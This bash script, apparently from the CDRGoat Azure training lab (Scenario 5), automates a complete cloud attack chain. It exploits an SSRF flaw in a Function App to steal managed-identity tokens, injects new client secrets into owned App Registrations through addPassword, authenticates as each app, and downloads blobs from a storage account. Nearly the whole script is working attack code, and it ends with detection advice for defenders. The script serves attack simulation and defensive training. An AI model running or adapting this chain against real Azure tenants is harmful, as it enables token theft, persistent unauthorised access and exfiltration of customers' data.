#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n[%s] %s[*]%s %s\n" "$(date +%H:%M:%S)" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "[%s] %s[OK]%s  %s\n" "$(date +%H:%M:%S)" "${GREEN}" "${RESET}" "$*"; }
err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \\/ _ \\/ ___/__  ___ _/ /_    " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \\/ _ \`/ __/   " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
printf "\n"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===       CDRGoat Azure - Scenario 5                 ===" "${RESET}"
  printf "%sSSRF on Function App → Blind SP Credential Injection%s\n\n" "${GREEN}" "${RESET}"
  printf "This automated attack script will:\n"
  printf "  • Step 1. Discover MSI endpoint via debug leak, steal MI tokens via SSRF\n"
  printf "  • Step 2. Attempt application listing (denied)\n"
  printf "  • Step 3. Discover owned applications via ownedObjects\n"
  printf "  • Step 4. Inject credentials into discovered apps (addPassword)\n"
  printf "  • Step 5. Authenticate as each app and find privileged one\n"
  printf "  • Step 6. Exfiltrate data from Storage Account\n"
}
banner

#############################################
# Preflight checks
#############################################
step "Preflight checks"
missing=0
for c in curl jq; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }

#############################################
# Step 1. Exploit SSRF to steal MI tokens
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Exploit SSRF to steal Managed Identity tokens  ===" "${RESET}"

step "Function App URL input"
read -r -p "  Function App URL (e.g., https://streamgoat-5-func-xxxxx.azurewebsites.net): " FUNC_URL
FUNC_URL="${FUNC_URL%/}"

if [ -z "$FUNC_URL" ]; then
  err "Function App URL is required"
  exit 1
fi

step "Verifying SSRF vulnerability"
spin_start "Testing SSRF via /api/fetch endpoint"

set +e
SSRF_TEST="$(curl -sS "${FUNC_URL}/api/fetch?url=https://ifconfig.me" 2>&1)"
CURL_RC=$?
set -e
spin_stop

if [ $CURL_RC -ne 0 ] || [ -z "$SSRF_TEST" ]; then
  err "SSRF test failed — cannot reach the Function App"
  exit 1
fi

ok "SSRF confirmed — function fetches arbitrary URLs"
info "Response: ${SSRF_TEST:0:50}..."

step "Discovering MSI endpoint via debug endpoint"
spin_start "Probing /api/health for leaked environment info"

set +e
HEALTH_JSON="$(curl -sS "${FUNC_URL}/api/health" 2>&1)"
CURL_RC=$?
set -e
spin_stop

IDENTITY_ENDPOINT="$(echo "$HEALTH_JSON" | jq -r '.identity_endpoint // empty')"
AZURE_CLIENT_ID="$(echo "$HEALTH_JSON" | jq -r '.azure_client_id // empty')"

if [ -z "$IDENTITY_ENDPOINT" ] || [ -z "$AZURE_CLIENT_ID" ]; then
  err "Could not discover MSI endpoint from debug endpoint"
  echo "$HEALTH_JSON" | head -5
  exit 1
fi

ok "Debug endpoint leaked MSI details"
info "Identity Endpoint: ${YELLOW}${IDENTITY_ENDPOINT}${RESET}"
info "Client ID: ${YELLOW}${AZURE_CLIENT_ID}${RESET}"

step "Exploiting SSRF to steal ARM token via App Service MSI endpoint"
spin_start "Requesting ARM management token via MSI"

MSI_ARM_URL="${IDENTITY_ENDPOINT}?resource=https://management.azure.com&api-version=2019-08-01&client_id=${AZURE_CLIENT_ID}"
ENCODED_MSI_URL="$(python3 -c "import urllib.parse; print(urllib.parse.quote('${MSI_ARM_URL}', safe=''))")"

set +e
ARM_TOKEN_JSON="$(curl -sS "${FUNC_URL}/api/fetch?url=${ENCODED_MSI_URL}")"
CURL_RC=$?
set -e
spin_stop

ARM_TOKEN="$(echo "$ARM_TOKEN_JSON" | jq -r '.access_token // empty')"

if [ -z "$ARM_TOKEN" ]; then
  err "Failed to steal ARM token via MSI endpoint"
  echo "$ARM_TOKEN_JSON" | head -5
  exit 1
fi

ok "ARM token stolen via SSRF → App Service MSI endpoint"

step "Stealing Microsoft Graph token"
spin_start "Requesting Graph token via MSI"

MSI_GRAPH_URL="${IDENTITY_ENDPOINT}?resource=https://graph.microsoft.com&api-version=2019-08-01&client_id=${AZURE_CLIENT_ID}"
ENCODED_GRAPH_URL="$(python3 -c "import urllib.parse; print(urllib.parse.quote('${MSI_GRAPH_URL}', safe=''))")"

set +e
GRAPH_TOKEN_JSON="$(curl -sS "${FUNC_URL}/api/fetch?url=${ENCODED_GRAPH_URL}")"
set -e
spin_stop

GRAPH_TOKEN="$(echo "$GRAPH_TOKEN_JSON" | jq -r '.access_token // empty')"

if [ -z "$GRAPH_TOKEN" ]; then
  err "Failed to steal Graph token via MSI endpoint"
  exit 1
fi

ok "Graph token stolen via SSRF → App Service MSI endpoint"

# Parse JWT to extract identity info
step "Analyzing stolen tokens (JWT)"
TOKEN_PAYLOAD="$(echo "$ARM_TOKEN" | awk -F. '{print $2}' | tr '_-' '/+' | base64 -d 2>/dev/null | jq .)"
MI_OID="$(echo "$TOKEN_PAYLOAD" | jq -r '.oid')"
TENANT_ID="$(echo "$TOKEN_PAYLOAD" | jq -r '.tid')"

GRAPH_PAYLOAD="$(echo "$GRAPH_TOKEN" | awk -F. '{print $2}' | tr '_-' '/+' | base64 -d 2>/dev/null | jq .)"
GRAPH_ROLES="$(echo "$GRAPH_PAYLOAD" | jq -r '.roles // [] | join(", ")')"

info "Managed Identity OID: ${YELLOW}${MI_OID}${RESET}"
info "Tenant ID: ${YELLOW}${TENANT_ID}${RESET}"
info "Graph roles: ${YELLOW}${GRAPH_ROLES}${RESET}"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "First, we found a ${RED}/api/health${RESET} debug endpoint that leaked the internal\n"
printf "MSI endpoint URL and the Managed Identity's client ID.\n\n"
printf "Then we exploited the SSRF vulnerability to reach the App Service MSI\n"
printf "endpoint and stole OAuth tokens for the Function App's Managed Identity.\n"
printf "Unlike VMs which use IMDS at ${YELLOW}169.254.169.254${RESET}, Azure Functions use an\n"
printf "internal MSI endpoint that requires the ${YELLOW}X-IDENTITY-HEADER${RESET} secret.\n"
printf "The SSRF function leaked this header in outbound requests.\n\n"
printf "The MI has ${MAGENTA}Application.ReadWrite.OwnedBy${RESET} on Microsoft Graph.\n"
printf "This grants the ability to manage App Registrations that the MI owns.\n\n"

read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 2. Attempt full application listing
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 2. Attempt application listing (demonstrate access denied)  ===" "${RESET}"

step "Attempting to list all applications via Graph API"
spin_start "GET /applications"

set +e
ALL_APPS_JSON="$(curl -sS -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/applications")"
set -e
spin_stop

if echo "$ALL_APPS_JSON" | jq -e '.error' >/dev/null 2>&1; then
  err_code="$(echo "$ALL_APPS_JSON" | jq -r '.error.code')"
  err_msg="$(echo "$ALL_APPS_JSON" | jq -r '.error.message' | head -1)"
  err "Graph API denied: ${err_code}"
  info "Message: ${err_msg:0:120}"
  info "The MI has Application.ReadWrite.OwnedBy — it cannot list ALL apps"
else
  ok "Listing succeeded (unexpected — MI may have broader permissions)"
fi

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "The MI only has ${MAGENTA}Application.ReadWrite.OwnedBy${RESET}, not Application.Read.All.\n"
printf "This means it ${RED}cannot enumerate all applications${RESET} in the tenant.\n\n"
printf "However, we can query the MI's ${YELLOW}owned objects${RESET} to discover\n"
printf "which App Registrations it owns — and then inject credentials into them.\n\n"

read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 3. Discover owned applications
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 3. Discover owned applications via ownedObjects  ===" "${RESET}"

step "Querying owned objects for the Managed Identity"
spin_start "GET /servicePrincipals/${MI_OID}/ownedObjects"

set +e
OWNED_JSON="$(curl -sS -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/servicePrincipals/${MI_OID}/ownedObjects")"
set -e
spin_stop

if echo "$OWNED_JSON" | jq -e '.error' >/dev/null 2>&1; then
  err "Failed to query owned objects"
  echo "$OWNED_JSON" | jq '.error'
  exit 1
fi

OWNED_APPS="$(echo "$OWNED_JSON" | jq '[.value[] | select(.["@odata.type"] == "#microsoft.graph.application")]')"
OWNED_COUNT="$(echo "$OWNED_APPS" | jq 'length')"

ok "Discovered ${YELLOW}${OWNED_COUNT}${RESET} owned App Registrations"

echo "$OWNED_APPS" | jq -r --arg Y "$YELLOW" --arg R "$RESET" \
  '.[] | "  • \($Y)\(.displayName)\($R) (appId: \(.appId), objectId: \(.id))"'

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "Even without Application.Read.All, we discovered ${YELLOW}${OWNED_COUNT} apps${RESET}\n"
printf "that the MI owns. The ${MAGENTA}ownedObjects${RESET} endpoint reveals them.\n\n"
printf "Next: We will inject new client secrets into each app using ${RED}addPassword${RESET}.\n"
printf "This is the Azure equivalent of AWS's CreateAccessKey blind enumeration.\n\n"

read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 4. Inject credentials into apps
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Inject credentials into discovered apps (addPassword)  ===" "${RESET}"

step "Injecting new client secrets into each owned App Registration"

declare -A APP_CREDS

for i in $(seq 0 $((OWNED_COUNT - 1))); do
  APP_NAME="$(echo "$OWNED_APPS" | jq -r ".[$i].displayName")"
  APP_OBJ_ID="$(echo "$OWNED_APPS" | jq -r ".[$i].id")"
  APP_CLIENT_ID="$(echo "$OWNED_APPS" | jq -r ".[$i].appId")"

  spin_start "addPassword → ${APP_NAME}"

  set +e
  ADD_PWD_RESPONSE="$(curl -sS -X POST \
    -H "Authorization: Bearer $GRAPH_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"passwordCredential":{"displayName":"injected-by-attacker"}}' \
    "https://graph.microsoft.com/v1.0/applications/${APP_OBJ_ID}/addPassword")"
  set -e

  spin_stop

  SECRET_VALUE="$(echo "$ADD_PWD_RESPONSE" | jq -r '.secretText // empty')"

  if [ -n "$SECRET_VALUE" ]; then
    ok "Credential injected for ${YELLOW}${APP_NAME}${RESET}"
    info "  Client ID: ${APP_CLIENT_ID}"
    info "  Secret:    ${SECRET_VALUE:0:12}..."
    APP_CREDS["${APP_CLIENT_ID}"]="${SECRET_VALUE}|${APP_NAME}"
  else
    err "Failed to inject credential for ${APP_NAME}"
    echo "$ADD_PWD_RESPONSE" | jq '.error' 2>/dev/null || true
  fi
done

CRED_COUNT="${#APP_CREDS[@]}"
ok "Successfully injected credentials into ${YELLOW}${CRED_COUNT}${RESET} App Registrations"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We used ${RED}addPassword${RESET} to inject new client secrets into ${YELLOW}${CRED_COUNT}${RESET} apps.\n\n"
printf "This is the Azure equivalent of AWS's ${MAGENTA}iam:CreateAccessKey${RESET} attack:\n"
printf "  • AWS: CreateAccessKey on IAM users to steal credentials\n"
printf "  • Azure: addPassword on App Registrations to inject credentials\n\n"
printf "The original application owners are ${RED}not notified${RESET} about new credentials.\n\n"

read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 5. Auth as each app, find privileged
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. Authenticate as each app and find privileged one  ===" "${RESET}"

step "Testing each stolen credential for Azure RBAC access"

PRIVILEGED_CLIENT_ID=""
PRIVILEGED_SECRET=""
PRIVILEGED_NAME=""
PRIVILEGED_SP_OID=""

for client_id in "${!APP_CREDS[@]}"; do
  IFS='|' read -r secret app_name <<< "${APP_CREDS[$client_id]}"

  spin_start "Authenticating as ${app_name}"

  set +e
  TOKEN_RESP="$(curl -sS -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "client_id=${client_id}&client_secret=${secret}&grant_type=client_credentials&resource=https://management.azure.com" \
    "https://login.microsoftonline.com/${TENANT_ID}/oauth2/token")"
  set -e

  spin_stop

  APP_TOKEN="$(echo "$TOKEN_RESP" | jq -r '.access_token // empty')"

  if [ -z "$APP_TOKEN" ]; then
    info "  ${app_name}: No ARM access (expected for apps without Azure RBAC roles)"
    continue
  fi

  ok "  ${app_name}: ARM token acquired — checking role assignments"

  # Parse SP OID from token
  APP_PAYLOAD="$(echo "$APP_TOKEN" | awk -F. '{print $2}' | tr '_-' '/+' | base64 -d 2>/dev/null | jq .)"
  SP_OID="$(echo "$APP_PAYLOAD" | jq -r '.oid')"

  # Check subscriptions
  SUBS_JSON="$(curl -sS -H "Authorization: Bearer $APP_TOKEN" \
    "https://management.azure.com/subscriptions?api-version=2022-12-01")"

  SUB_COUNT="$(echo "$SUBS_JSON" | jq '.value | length')"

  if [ "$SUB_COUNT" -gt 0 ]; then
    SUB_ID="$(echo "$SUBS_JSON" | jq -r '.value[0].subscriptionId')"

    # Check role assignments
    ROLES_JSON="$(curl -sS -H "Authorization: Bearer $APP_TOKEN" \
      "https://management.azure.com/subscriptions/${SUB_ID}/providers/Microsoft.Authorization/roleAssignments?\$filter=principalId%20eq%20'${SP_OID}'&api-version=2022-04-01")"

    ROLE_COUNT="$(echo "$ROLES_JSON" | jq '.value | length')"

    if [ "$ROLE_COUNT" -gt 0 ]; then
      # Resolve role names
      echo "$ROLES_JSON" | jq -c '.value[]' | while read -r entry; do
        role_def_id="$(echo "$entry" | jq -r '.properties.roleDefinitionId | split("/")[-1]')"
        role_name="$(curl -sS -H "Authorization: Bearer $APP_TOKEN" \
          "https://management.azure.com/subscriptions/${SUB_ID}/providers/Microsoft.Authorization/roleDefinitions/${role_def_id}?api-version=2022-04-01" \
          | jq -r '.properties.roleName // "Unknown"')"
        scope="$(echo "$entry" | jq -r '.properties.scope')"
        printf "    Role: %s%s%s  Scope: %s\n" "$YELLOW" "$role_name" "$RESET" "$scope"
      done

      PRIVILEGED_CLIENT_ID="$client_id"
      PRIVILEGED_SECRET="$secret"
      PRIVILEGED_NAME="$app_name"
      PRIVILEGED_SP_OID="$SP_OID"
    fi
  fi
done

if [ -z "$PRIVILEGED_CLIENT_ID" ]; then
  err "No privileged App Registration found"
  exit 1
fi

printf "\n"
ok "Found privileged app: ${RED}${PRIVILEGED_NAME}${RESET} with Azure RBAC roles"
info "Client ID: ${PRIVILEGED_CLIENT_ID}"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We authenticated as each stolen App Registration and checked RBAC.\n\n"
printf "Found ${RED}${PRIVILEGED_NAME}${RESET} has ${YELLOW}Contributor${RESET} on the Resource Group.\n"
printf "This grants access to manage resources including Storage Accounts.\n\n"

read -r -p "Step 5 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 6. Exfiltrate data from Storage
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 6. Exfiltrate data from Storage Account  ===" "${RESET}"

step "Authenticating as privileged app for storage access"
spin_start "Requesting storage token"

set +e
STORAGE_TOKEN_RESP="$(curl -sS -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=${PRIVILEGED_CLIENT_ID}&client_secret=${PRIVILEGED_SECRET}&grant_type=client_credentials&resource=https://storage.azure.com" \
  "https://login.microsoftonline.com/${TENANT_ID}/oauth2/token")"
set -e

STORAGE_TOKEN="$(echo "$STORAGE_TOKEN_RESP" | jq -r '.access_token // empty')"
spin_stop

if [ -z "$STORAGE_TOKEN" ]; then
  err "Failed to get storage token"
  exit 1
fi

ok "Storage token acquired"

step "Getting ARM token for resource enumeration"
spin_start "Requesting ARM token"

set +e
PRIV_ARM_RESP="$(curl -sS -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=${PRIVILEGED_CLIENT_ID}&client_secret=${PRIVILEGED_SECRET}&grant_type=client_credentials&resource=https://management.azure.com" \
  "https://login.microsoftonline.com/${TENANT_ID}/oauth2/token")"
set -e

PRIV_ARM_TOKEN="$(echo "$PRIV_ARM_RESP" | jq -r '.access_token // empty')"
spin_stop

SUBS_JSON="$(curl -sS -H "Authorization: Bearer $PRIV_ARM_TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2022-12-01")"
SUB_ID="$(echo "$SUBS_JSON" | jq -r '.value[0].subscriptionId')"

step "Enumerating storage accounts"
spin_start "Listing storage resources"

RESOURCES_JSON="$(curl -sS -H "Authorization: Bearer $PRIV_ARM_TOKEN" \
  "https://management.azure.com/subscriptions/${SUB_ID}/resources?api-version=2022-12-01")"

STORAGE_ACCOUNTS="$(echo "$RESOURCES_JSON" | jq -r '.value[] | select(.type == "Microsoft.Storage/storageAccounts") | .name')"
spin_stop

ok "Found storage accounts:"
echo "$STORAGE_ACCOUNTS" | while read -r sa; do
  printf "  • %s%s%s\n" "$YELLOW" "$sa" "$RESET"
done

# Pick the data storage account (the one with "data" in the name)
TARGET_SA="$(echo "$STORAGE_ACCOUNTS" | grep data | head -1)"
if [ -z "$TARGET_SA" ]; then
  TARGET_SA="$(echo "$STORAGE_ACCOUNTS" | head -1)"
fi

info "Target: ${YELLOW}${TARGET_SA}${RESET}"

step "Listing containers in ${TARGET_SA}"
spin_start "Enumerating blob containers"

CONTAINERS_XML="$(curl -sS \
  -H "Authorization: Bearer $STORAGE_TOKEN" \
  -H "x-ms-version: 2020-10-02" \
  "https://${TARGET_SA}.blob.core.windows.net/?comp=list")"

spin_stop

# Parse container names from XML
CONTAINER_NAMES="$(echo "$CONTAINERS_XML" | grep -oP '<Name>\K[^<]+' || echo "$CONTAINERS_XML" | sed -n 's/.*<Name>\([^<]*\)<\/Name>.*/\1/p')"

ok "Found containers:"
echo "$CONTAINER_NAMES" | while read -r cn; do
  [ -n "$cn" ] && printf "  • %s%s%s\n" "$YELLOW" "$cn" "$RESET"
done

TARGET_CONTAINER="$(echo "$CONTAINER_NAMES" | head -1)"
info "Target container: ${YELLOW}${TARGET_CONTAINER}${RESET}"

step "Listing blobs in ${TARGET_CONTAINER}"
spin_start "Enumerating blobs"

BLOBS_XML="$(curl -sS \
  -H "Authorization: Bearer $STORAGE_TOKEN" \
  -H "x-ms-version: 2020-10-02" \
  "https://${TARGET_SA}.blob.core.windows.net/${TARGET_CONTAINER}?restype=container&comp=list")"

spin_stop

BLOB_NAMES="$(echo "$BLOBS_XML" | grep -oP '<Name>\K[^<]+' || echo "$BLOBS_XML" | sed -n 's/.*<Name>\([^<]*\)<\/Name>.*/\1/p')"

ok "Found blobs:"
echo "$BLOB_NAMES" | while read -r bn; do
  [ -n "$bn" ] && printf "  • %s%s%s\n" "$YELLOW" "$bn" "$RESET"
done

step "Downloading and displaying exfiltrated data"

printf "\n%s%s%s\n" "${BOLD}${RED}" "=== EXFILTRATED DATA ===" "${RESET}"

echo "$BLOB_NAMES" | while read -r blob; do
  [ -z "$blob" ] && continue
  printf "\n  %s--- %s ---%s\n" "$YELLOW" "$blob" "$RESET"
  curl -sS \
    -H "Authorization: Bearer $STORAGE_TOKEN" \
    -H "x-ms-version: 2020-10-02" \
    "https://${TARGET_SA}.blob.core.windows.net/${TARGET_CONTAINER}/${blob}" | head -20
  printf "\n"
done

################################################################################
# Final Summary
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Attack Simulation Complete  ===" "${RESET}"

printf "\n%s%s%s\n" "${BOLD}${GREEN}" "Attack chain executed:" "${RESET}"
printf "  1. Discovered MSI endpoint via debug leak, stole MI tokens via SSRF\n"
printf "  2. Demonstrated that full app listing is denied (Application.ReadWrite.OwnedBy only)\n"
printf "  3. Discovered owned App Registrations via ownedObjects endpoint\n"
printf "  4. Injected new credentials into all owned apps (addPassword)\n"
printf "  5. Authenticated as each app — found one with Contributor on RG\n"
printf "  6. Exfiltrated sensitive data from Storage Account\n\n"

printf "%s%s%s\n" "${BOLD}${RED}" "Impact:" "${RESET}"
printf "  • ${CRED_COUNT} App Registrations compromised with injected credentials\n"
printf "  • Sensitive customer data exfiltrated from Storage Account\n"
printf "  • Attacker has persistent access via injected client secrets\n\n"

printf "%s\n" "Defenders should monitor for:"
printf "  • SSRF patterns (internal IPs/MSI endpoints in Function App outbound requests)\n"
printf "  • Debug/health endpoints leaking sensitive environment variables\n"
printf "  • addPassword calls from Managed Identities\n"
printf "  • New client credentials on App Registrations\n"
printf "  • Authentication from unexpected Service Principals\n"
printf "  • Storage Account access from unusual identities\n"
